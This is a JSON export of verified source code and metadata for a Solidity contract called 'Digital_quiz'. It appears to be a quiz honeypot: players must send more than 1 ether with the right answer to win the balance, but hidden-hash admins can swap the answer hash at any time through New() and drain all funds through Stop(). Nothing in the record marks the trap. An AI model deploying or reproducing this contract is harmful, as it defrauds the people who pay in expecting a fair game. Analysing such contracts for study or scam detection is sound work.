[{"SourceCode":"pragma solidity ^0.4.25;\r\n\r\ncontract Digital_quiz\r\n{\r\n    function Try(string _response) external payable \r\n    {\r\n        require(msg.sender == tx.origin);\r\n\r\n        if(responseHash == keccak256(_response) \u0026\u0026 msg.value \u003E 1 ether)\r\n        {\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n    }\r\n\r\n    string public question;\r\n\r\n    bytes32 responseHash;\r\n\r\n    mapping (bytes32=\u003Ebool) admin;\r\n\r\n    function Start(string _question, string _response) public payable isAdmin{\r\n        if(responseHash==0x0){\r\n            responseHash = keccak256(_response);\r\n            question = _question;\r\n        }\r\n    }\r\n\r\n    function Stop() public payable isAdmin {\r\n        msg.sender.transfer(this.balance);\r\n    }\r\n\r\n    function New(string _question, bytes32 _responseHash) public payable isAdmin {\r\n        question = _question;\r\n        responseHash = _responseHash;\r\n    }\r\n\r\n    constructor(bytes32[] admins) public{\r\n        for(uint256 i=0; i\u003C admins.length; i\u002B\u002B){\r\n            admin[admins[i]] = true;        \r\n        }       \r\n    }\r\n\r\n    modifier isAdmin(){\r\n        require(admin[keccak256(msg.sender)]);\r\n        _;\r\n    }\r\n\r\n    function() public payable{}\r\n}","ABI":"[{\u0022constant\u0022:false,\u0022inputs\u0022:[{\u0022name\u0022:\u0022_response\u0022,\u0022type\u0022:\u0022string\u0022}],\u0022name\u0022:\u0022Try\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:true,\u0022stateMutability\u0022:\u0022payable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:true,\u0022inputs\u0022:[],\u0022name\u0022:\u0022question\u0022,\u0022outputs\u0022:[{\u0022name\u0022:\u0022\u0022,\u0022type\u0022:\u0022string\u0022}],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022view\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:false,\u0022inputs\u0022:[],\u0022name\u0022:\u0022Stop\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:true,\u0022stateMutability\u0022:\u0022payable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:false,\u0022inputs\u0022:[{\u0022name\u0022:\u0022_question\u0022,\u0022type\u0022:\u0022string\u0022},{\u0022name\u0022:\u0022_response\u0022,\u0022type\u0022:\u0022string\u0022}],\u0022name\u0022:\u0022Start\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:true,\u0022stateMutability\u0022:\u0022payable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022constant\u0022:false,\u0022inputs\u0022:[{\u0022name\u0022:\u0022_question\u0022,\u0022type\u0022:\u0022string\u0022},{\u0022name\u0022:\u0022_responseHash\u0022,\u0022type\u0022:\u0022bytes32\u0022}],\u0022name\u0022:\u0022New\u0022,\u0022outputs\u0022:[],\u0022payable\u0022:true,\u0022stateMutability\u0022:\u0022payable\u0022,\u0022type\u0022:\u0022function\u0022},{\u0022inputs\u0022:[{\u0022name\u0022:\u0022admins\u0022,\u0022type\u0022:\u0022bytes32[]\u0022}],\u0022payable\u0022:false,\u0022stateMutability\u0022:\u0022nonpayable\u0022,\u0022type\u0022:\u0022constructor\u0022},{\u0022payable\u0022:true,\u0022stateMutability\u0022:\u0022payable\u0022,\u0022type\u0022:\u0022fallback\u0022}]","ContractName":"Digital_quiz","CompilerVersion":"v0.4.25\u002Bcommit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000003373aa1011b31b4026056b211aff29e9a1ffce9343d3a4b4dcab60ff9ad35e12fac875aefd920eb697e291f9414a2103c99426ce8ef319508f7fb321d71e92e858f59c0eee0b6ed0c521c2609770180e5d7de0e1de3a415621ca6ba99c914400e","Library":"","SwarmSource":"bzzr://5fec5bd84ea97d82a94219c968642f66501979c0b9d58e99afc9cc00bf1a0d8d"}]